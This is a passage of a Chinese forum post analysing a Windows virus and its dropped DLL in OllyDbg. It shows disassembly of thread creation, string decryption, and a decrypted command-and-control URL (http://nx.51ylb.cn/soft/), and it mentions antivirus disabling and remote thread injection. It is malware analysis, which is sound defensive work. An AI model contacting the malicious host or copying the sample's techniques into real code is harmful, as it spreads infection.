
紧接着，执行这个 `del.bat`：

```
0040156A    8D85 F8FBFFFF   lea     eax, dword ptr [ebp-408]  

00401570    6A 00          push    0  

00401572    50             push    eax  

00401573    FF15 84C04100  call    dword ptr [<&kernel32.WinExec>]        ; kernel32.WinExec  
```

经过一系列的 `sleep` 和 `ret` 后，程序结束。

这个病毒会使得金山毒霸和卡巴斯基失效，注册自身的复制品为系统服务程序，在它释放并安装在的 `dll` 中甚至有远程线程注入的代码。时间不够没有分析完。

作者的确是够老手，壳是未知的，为了躲避查杀代码乱的一团糟。

`http://bbs.pediy.com/attachment.php?attachmentid=11006&stc=1&d=1199705684`

谢谢观摩！！！

祝各位一切顺利！！！

### 上传的附件

| 图片 | 文件 |
| :--- | :--- |
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | `b.rar` |

昨天把病毒释放的 DLL 分析了一下，果然病毒比较厉害。

病毒衍生的 dll 文件名称为 `%system32%\555E9A24.DLL`

开始，用 OD 装载 DLL，入口点处

```
10002ED9 >/$  55             push    ebp  
10002EDA  |.  8BEC           mov     ebp, esp  
10002EDC  |.  81EC CC000000  sub     esp, 0CC  
10002EE2  |.  56             push    esi  
10002EE3  |.  BE 00AE0010    mov     esi, 1000AE00  
10002EE8  |.  57             push    edi  
10002EE9  |.  8D85 38FFFFFF  lea     eax, dword ptr [ebp-C8]  
10002EEF  |.  56             push    esi                              ; |format => ""  
10002EF0  |.  50             push    eax                              ; |s  
10002EF1  |.  E8 AA140000    call    <jmp.&MSVCRT.sprintf>            ; \\sprintf  
```

不用理会一路的 `sprintf` 和 `sleep`，走啊走啊，终于来到正题

```
100034BD  |.  50             push    eax                              ; /pThreadId  
100034BE  |.  33C0           xor     eax, eax                         ; |  
100034C0  |.  50             push    eax                              ; |CreationFlags => 0  
100034C1  |.  50             push    eax                              ; |pThreadParm => NULL  
100034C2  |.  68 CB250010    push    100025CB                         ; |ThreadFunction = 555E9A24.100025CB   ////等到创建了线程后，跟过去吧  
100034C7  |.  50             push    eax                              ; |StackSize => 0  
100034C8  |.  50             push    eax                              ; |pSecurity => NULL  
100034C9  |.  FF15 B4500010  call    dword ptr [<&KERNEL32.CreateThread> ; \\CreateThread  
100034CF  |>  \\8BC7           mov     eax, edi  
100034D1  |.  5F             pop     edi  
100034D2  |.  5E             pop     esi  
100034D3  |.  C9             leave  
100034D4  \\.  C2 0C00         retn    0C  
```

到这里程序就结束了，现在就是跟踪主线程创建的子线程。

`CTRL+G`，输入 `100025CB`，来到

```
100025CB  /.  55             push    ebp  
100025CC  |.  8BEC           mov     ebp, esp  
100025CE  |.  81EC E4030000  sub     esp, 3E4  
100025D4  |.  53             push    ebx  
```

右键，此处为新 `EIP`（反正我是用这种方式跟踪线程的，感觉挺不错的，因为堆栈肯定是平衡的）

继续前进吧

```
10002634  |.  50             push    eax                              ;  ASCII "AD09E3"  
10002635  |.  8D85 2CFEFFFF  lea     eax, dword ptr [ebp-1D4]  
1000263B  |.  50             push    eax                              ;  ASCII "AD09E3"  
1000263C  |.  E8 200F0000    call    10003561                         ;  没什么东西，都是一些字符串运算，返回 ASCII "3FD1E80C"的函数  
```

紧接着，又是一堆字符串运算的函数和一堆 `sleep`，统统跳过，来到

```
100026D9  |.  68 90700010    push    10007090  
100026DE  |.  E8 59040000    call    10002B3C  
```

进去

```
10002B92  |.  68 04010000    push    104                                ; /BufSize = 104 (260.)  
10002B97  |.  50             push    eax                              ; |Buffer  
10002B98  |.  FF15 B0500010  call    dword ptr [<&KERNEL32.GetSystemDire>; \\GetSystemDirectoryA    ///获取系统目录  
```

病毒又在组装字符串，得到 `%system32%\3FD1E80C.EXE`，并打开这个文件（它想干什么？？？继续跟踪吧）

```
10002E0C  |.  68 A06B0010    push    10006BA0                         ; /StringToAdd = "\\"  
10002E11  |.  50             push    eax                              ; |ConcatString  
10002E12  |.  FF15 AC500010  call    dword ptr [<&KERNEL32.lstrcatA>]    ; \\lstrcatA  
10002E18  |.  8D85 2CFEFFFF  lea     eax, dword ptr [ebp-1D4]  
10002E1E  |.  68 04630010    push    10006304                         ; /src = "3FD1E80C.EXE"  
10002E23  |.  50             push    eax                              ; |dest  
10002E24  |.  E8 83150000    call    <jmp.&MSVCRT.strcat>             ; \\strcat  
10002E29  |.  8D85 2CFEFFFF  lea     eax, dword ptr [ebp-1D4]  
10002E2F  |.  68 CC6D0010    push    10006DCC                         ; /mode = "rb"  
10002E34  |.  50             push    eax                              ; |path  
10002E35  |.  E8 F0150000    call    <jmp.&MSVCRT.fopen>              ; \\fopen  ///文件的 path = "C:\\WINDOWS\\system32\\3FD1E80C.EXE"  
```

从文件 `%system32%\3FD1E80C.EXE` 里面读出一个字符串

```
10002EB6  |.  FF75 FC        push    dword ptr [ebp-4]  
10002EB9  |.  8D85 28FDFFFF  lea     eax, dword ptr [ebp-2D8]  
10002EBF  |.  FF75 08        push    dword ptr [ebp+8]  
10002EC2  |.  50             push    eax                              ;  "pcbe.<=h!;<ugh'ki)vkev."  
10002EC3  |.  E8 F4FBFFFF    call    10002ABC        ///解密函数  
```

这个 `"pcbe.<=h!;<ugh'ki)vkev."` 是什么???没有任何具体含义阿!?病毒岂不是白读文件了???不会的，这个肯定是加密以后的字符串，看它的解密结果

在 `10002ec3` 这个 `call` 之后呢，堆栈中

```
0006EECC   0006EEE4  
0006EED0   10007090  ASCII "http://nx.51ylb.cn/soft/"  
```

这就是解密结果了，一个网络连接，登陆一下，没有权限（由此可以基本确定这就是个毒站，呵呵）

病毒关闭文件，我们从函数里面返回

```
100026E3  |.  68 68A50010    push    1000A568  
100026E8  |.  E8 3AFCFFFF    call    10002327  
```

进去，看到连接网络的代码

```
10002327  /$  55             push    ebp  
10002328  |.  8BEC           mov     ebp, esp  
1000232A  |.  81EC D8000000  sub     esp, 0D8  
10002330  |.  56             push    esi                                ;  装载 rpc 库  
10002331  |.  68 346D0010    push    10006D34                           ; /FileName = "rpcrt4.dll"  
10002336  |.  FF15 D0500010  call    dword ptr [<&KERNEL32.LoadLibraryA>]  ; \\LoadLibraryA  
1000233C  |.  8BF0           mov     esi, eax  
1000233E  |.  85F6           test    esi, esi  
10002340  |.  74 2B          je      short 1000236D  
10002342  |.  68 1C6D0010    push    10006D1C                           ; /ProcNameOrOrdinal = "UuidCreateSequential"  
10002347  |.  56             push    esi                                ; |hModule  
10002348  |.  FF15 DC500010  call    dword ptr [<&KERNEL32.GetProcAddress>; \\GetProcAddress  
1000234E  |.  85C0           test    eax, eax  
10002350  |.  74 08          je      short 1000235A                        ;  获取函数 RPCRT4.UuidCreateSequential 的入口地址失败，跳走  
10002352  |.  8D4D F0        lea     ecx, dword ptr [ebp-10]  
10002355  |.  51             push    ecx  
10002356  |.  FFD0           call    eax                                  ;  RPCRT4.UuidCreateSequential  
10002358  |.  EB 0A          jmp     short 10002364  
1000235A  |>  8D45 F0        lea     eax, dword ptr [ebp-10]  
1000235D  |.  50             push    eax                                ;  获取函数 RPCRT4.UuidCreateSequential 的入口地址失败，采用 ole32.CoCreateGuid 方式  
1000235E  |.  FF15 60510010  call    dword ptr [<&ole32.CoCreateGuid>]     ;  ole32.CoCreateGuid  
10002364  |>  56             push    esi                                ; /hLibModule  
10002365  |.  FF15 D8500010  call    dword ptr [<&KERNEL32.FreeLibrary>]   ; \\FreeLibrary  
1000236B  |.  EB 0A          jmp     short 10002377  
1000236D  |>  8D45 F0        lea     eax, dword ptr [ebp-10]  
10002370  |.  50             push    eax  
10002371  |.  FF15 60510010  call    dword ptr [<&ole32.CoCreateGuid>]     ;  ole32.CoCreateGuid  
10002377  |>  BE 00AE0010    mov     esi, 1000AE00  
```

以上分析不知道对不对，反正我对网络的 api 不是很熟悉，大概能分析出它的意思

跳过一路的 `sprintf` 来到

```
10002442  |.  0FB645 FF      movzx   eax, byte ptr [ebp-1]  
10002446  |.  50             push    eax                                ; /<%2.2X>  
10002447  |.  0FB645 FE      movzx   eax, byte ptr [ebp-2]             ; |  
1000244B  |.  50             push    eax                                ; |<%2.2X>  
1000244C  |.  0FB645 FD      movzx   eax, byte ptr [ebp-3]             ; |  
10002450  |.  50             push    eax                                ; |<%2.2X>  
```
